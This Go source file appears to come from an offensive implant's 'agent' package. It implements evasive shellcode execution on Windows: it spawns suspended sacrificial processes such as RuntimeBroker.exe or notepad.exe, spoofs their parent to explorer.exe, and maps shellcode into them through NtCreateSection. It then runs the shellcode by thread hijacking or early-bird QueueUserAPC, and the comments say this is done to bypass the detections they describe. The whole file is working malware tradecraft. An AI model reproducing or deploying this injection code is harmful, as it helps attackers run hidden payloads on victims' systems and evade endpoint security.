//go:build windows

package agent

// forkRun — evasive shellcode execution in a sacrificial process.
//
// What was detected (classic pattern):
//   VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
//
// What this does instead:
//   1. PPID spoofing — process appears as child of explorer.exe
//   2. NtCreateSection + NtMapViewOfSection — no WPM, no VirtualAllocEx
//   3. Thread hijacking (GetThreadContext/SetThreadContext) — no CreateRemoteThread
//   4. Indirect NtProtectVirtualMemory — bypasses userland hook if present

import (
	"fmt"
	"os"
	"strings"

	"golang.org/x/sys/windows"
)

// forkRun spawns a sacrificial process and executes shellcode inside it.
// Output is captured via anonymous pipe on stdout/stderr.
// The sacrificial process is terminated after execution.
func forkRun(sc []byte, process string) (string, error) {
	if process == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		// Use RuntimeBroker.exe or svchost.exe — both are common, long-lived
		candidates := []string{
			sysroot + `\System32\RuntimeBroker.exe`,
			sysroot + `\System32\dllhost.exe`,
			sysroot + `\System32\WerFault.exe`,
		}
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				process = c
				break
			}
		}
		if process == "" {
			process = sysroot + `\System32\svchost.exe`
		}
	}

	// ── Step 1: Capture pipe ──────────────────────────────────────────────────
	var readPipe, writePipe windows.Handle
	sa := windows.SecurityAttributes{InheritHandle: 1}
	sa.Length = uint32(8 + 4 + 8) // sizeof(SECURITY_ATTRIBUTES)
	if err := windows.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe: %w", err)
	}
	windows.SetHandleInformation(readPipe, windows.HANDLE_FLAG_INHERIT, 0)

	// ── Step 2: Spawn suspended with PPID spoof ───────────────────────────────
	pi, err := spawnSuspendedSpoofed(process)
	windows.CloseHandle(writePipe) // close our copy
	if err != nil {
		windows.CloseHandle(readPipe)
		return "", fmt.Errorf("spawn(%s): %w", process, err)
	}

	// ── Step 3: Section mapping — write shellcode into target ─────────────────
	// NtCreateSection + NtMapViewOfSection: no WriteProcessMemory, no VirtualAllocEx
	remoteAddr, err := injectViaSection(pi.Process, sc)
	if err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(readPipe)
		return "", fmt.Errorf("section inject: %w", err)
	}

	// ── Step 4: Thread hijacking — redirect main thread to shellcode ──────────
	// No CreateRemoteThread, no NtCreateThreadEx
	if err := hijackThread(pi.Thread, remoteAddr); err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(readPipe)
		return "", fmt.Errorf("thread hijack: %w", err)
	}

	// ── Step 5: Resume thread ─────────────────────────────────────────────────
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(readPipe)
		return "", fmt.Errorf("ResumeThread: %w", err)
	}
	windows.CloseHandle(pi.Thread)

	// ── Step 6: Collect output (max 60s) ─────────────────────────────────────
	doneCh := make(chan string, 1)
	go func() {
		var sb strings.Builder
		buf := make([]byte, 4096)
		for {
			var n uint32
			e := windows.ReadFile(readPipe, buf, &n, nil)
			if n > 0 {
				sb.Write(buf[:n])
			}
			if e != nil {
				break
			}
		}
		doneCh <- sb.String()
	}()

	// Wait for process or timeout
	procWaitForSingleObject.Call(uintptr(pi.Process), uintptr(60000))
	windows.CloseHandle(readPipe)

	var out string
	select {
	case out = <-doneCh:
	default:
		out = ""
	}
	terminateSacrificial(pi)

	if out == "" {
		out = fmt.Sprintf("[+] shellcode executed via section+hijack in %s", process)
	}
	return out, nil
}

func terminateSacrificial(pi windows.ProcessInformation) {
	procTerminateProcess.Call(uintptr(pi.Process), 0)
	windows.CloseHandle(pi.Process)
}

// ── Early-bird APC injection ──────────────────────────────────────────────────

var procQueueUserAPC = kernel32.NewProc("QueueUserAPC")

// forkRunAPC spawns a sacrificial process and injects shellcode via QueueUserAPC
// (early-bird pattern). The APC fires before any user code runs because Windows
// loader enters an alertable wait during CRT/ntdll initialisation.
// Unlike thread hijacking, APC injection does not overwrite RIP.
func forkRunAPC(sc []byte, process string) (string, error) {
	if process == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		// Prefer plain user binaries — system binaries (RuntimeBroker, dllhost)
		// are PPL-protected or Defender-monitored on Server 2022 and may block suspend.
		for _, c := range []string{
			sysroot + `\System32\notepad.exe`,
			sysroot + `\System32\cmd.exe`,
			sysroot + `\SysWOW64\notepad.exe`,
		} {
			if _, err := os.Stat(c); err == nil {
				process = c
				break
			}
		}
		if process == "" {
			process = sysroot + `\System32\cmd.exe`
		}
	}

	// Spawn suspended with PPID spoofed to explorer.exe.
	pi, err := spawnSuspendedSpoofed(process)
	if err != nil {
		return "", fmt.Errorf("spawn(%s): %w", process, err)
	}

	// Write shellcode via NtCreateSection + NtMapViewOfSection (no WPM)
	remoteAddr, err := injectViaSection(pi.Process, sc)
	if err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("section inject: %w", err)
	}

	// Queue APC to main thread — fires on first alertable wait in loader
	r, _, e := procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	if r == 0 {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("QueueUserAPC: %w", e)
	}

	// Resume — shellcode fires before entry point, process stays alive as host
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("ResumeThread: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return fmt.Sprintf("[+] APC shellcode queued in %s (early-bird)", process), nil
}
